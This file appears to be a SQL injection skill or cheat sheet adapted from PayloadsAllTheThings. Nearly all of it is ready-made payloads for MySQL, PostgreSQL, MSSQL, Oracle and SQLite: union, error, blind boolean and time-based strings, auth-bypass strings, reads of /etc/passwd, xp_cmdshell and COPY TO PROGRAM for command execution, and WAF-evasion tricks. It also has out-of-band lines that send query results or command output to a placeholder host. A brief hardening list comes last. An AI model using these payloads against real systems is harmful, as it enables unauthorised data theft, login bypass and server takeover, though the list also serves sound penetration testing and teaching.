---
name: sql-injection
description: Inject SQL across MySQL, PostgreSQL, MSSQL, Oracle, SQLite; in-band, blind boolean/time, OOB; WAF bypass; second-order and stored variants; sqlmap automation
domain: cybersecurity
subdomain: web-application-security
tags: [sqli, sqlmap, blind-sqli, mysql, mssql, postgres, oracle]
version: "1.0"
license: MIT
source: PayloadsAllTheThings/SQL Injection
---

# SQL Injection

## Overview
Untrusted input concatenated into SQL queries lets attackers alter query logic — auth bypass, data exfil, file read/write, RCE on database-host depending on DBMS.

## Classes

### In-band (Union / Error)
- `' UNION SELECT NULL,NULL,@@version-- -`
- `' AND extractvalue(1,concat(0x7e,(SELECT user())))-- -`  (MySQL error)
- `' AND CAST((SELECT version()) AS int)=1-- -` (Postgres error)

### Blind Boolean
- `' AND SUBSTRING(user(),1,1)='r'-- -`
- `' AND (SELECT CASE WHEN ... THEN 1 ELSE 1/0 END)-- -`

### Blind Time
- MySQL: `' AND SLEEP(5)-- -`, `' OR IF(1=1,SLEEP(5),0)-- -`
- Postgres: `'; SELECT pg_sleep(5)-- -`
- MSSQL: `'; WAITFOR DELAY '0:0:5'--`
- Oracle: `' || dbms_pipe.receive_message('a',5)-- -`
- SQLite: `' AND randomblob(50000000)-- -`

### Out-of-band (OOB)
- MSSQL: `; exec master..xp_dirtree '\\\\OOB\\share'`
- Oracle: `UTL_HTTP.request('http://OOB/'||(SELECT user FROM dual))`
- MySQL (Windows): `SELECT LOAD_FILE(CONCAT('\\\\\\\\OOB\\\\',(SELECT pass FROM users LIMIT 1)))`
- Postgres: `COPY (SELECT '') TO PROGRAM 'curl http://OOB/$(id)'` (superuser only).

### Second-order
Payload stored (e.g. via signup `name='\\`), executed later in admin page that builds a query from stored data.

## DBMS Fingerprinting
- `@@version` (MSSQL, MySQL).
- `version()` (Postgres, MySQL).
- `banner FROM v$version` (Oracle).
- `sqlite_version()` (SQLite).
- Comment styles: `--`, `#`, `/**/`, `-- -`.

## Auth Bypass Classics
```
' OR '1'='1'-- -
' OR 1=1-- -
admin'--
admin'/*
') OR ('a'='a
```

## File Read / Write
- MySQL: `LOAD_FILE('/etc/passwd')`; `INTO OUTFILE '/var/www/x.php'` (needs FILE priv + secure_file_priv).
- Postgres: `pg_read_server_files` extension; `COPY ... FROM PROGRAM` for RCE (superuser).
- MSSQL: `xp_cmdshell 'whoami'` (if enabled); `BULK INSERT`.
- Oracle: `UTL_FILE`.

## WAF Bypass Tricks
- Comments: `SEL/**/ECT`, `SE%0aLECT`.
- Case: `sElEcT`.
- Encoding: URL, double URL, unicode.
- Equivalent functions: `SUBSTR` vs `MID` vs `SUBSTRING`.
- No-space: `SELECT/**/x`, `SELECT(1)FROM(t)`, tabs/newlines.
- `'='`, `LIKE`, `BETWEEN` swaps.
- `UNION ALL`, `SELECT 1,2,3` column-count via NULL fuzzing.

## Tools
- **sqlmap** (autopwn).
- **Ghauri**, **NoSQLMap** (NoSQL).
- **wafw00f** + bypass tampers.

## Hardening
- Parameterized queries / prepared statements / ORM bind variables exclusively.
- Stored procedures *if* internally parameterized.
- Principle of least privilege on DB user (no FILE, no xp_cmdshell, no superuser).
- WAF as defense-in-depth, not primary control.

## References
- `payloadsallthethings/SQL Injection/README.md` and DBMS-specific subfiles.
- PortSwigger SQL injection labs.
